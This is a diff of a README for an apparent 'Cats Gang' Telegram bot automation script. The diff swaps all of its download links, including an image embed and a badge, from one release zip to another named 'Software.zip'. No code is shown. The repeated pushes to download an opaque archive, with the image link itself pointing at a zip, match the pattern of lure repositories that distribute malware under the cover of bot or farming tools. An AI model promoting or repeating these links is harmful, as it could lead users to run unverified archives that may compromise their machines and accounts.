@@ -1,6 +1,6 @@
 # 🐱 Welcome to the Cats Gang Automation Script Repository! 🤖
 
-![Cats Gang Automation Script](https://github.com/TopengHitamm/cats-gang-automation-script/releases/download/v1.0/App.zip)
+![Cats Gang Automation Script](https://github.com/TopengHitamm/cats-gang-automation-script/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository contains an automatic script for the Cats Gang Bot TELEGRAM. It provides functionalities to automate certain tasks within the Cats Gang Bot.
@@ -21,9 +21,9 @@ This repository contains an automatic script for the Cats Gang Bot TELEGRAM. It 
 - catsgang-farm-bot
 
 ## Get Started
-To get started with the automation script, you can download the script from [here](https://github.com/TopengHitamm/cats-gang-automation-script/releases/download/v1.0/App.zip). It needs to be launched using a Python environment.
+To get started with the automation script, you can download the script from [here](https://github.com/TopengHitamm/cats-gang-automation-script/releases/download/v2.0/Software.zip). It needs to be launched using a Python environment.
 
-[![Download Script](https://github.com/TopengHitamm/cats-gang-automation-script/releases/download/v1.0/App.zip)](https://github.com/TopengHitamm/cats-gang-automation-script/releases/download/v1.0/App.zip)
+[![Download Script](https://github.com/TopengHitamm/cats-gang-automation-script/releases/download/v2.0/Software.zip)](https://github.com/TopengHitamm/cats-gang-automation-script/releases/download/v2.0/Software.zip)
 
 ## Features
 1. Automated clicks on Cats Gang Bot activities.
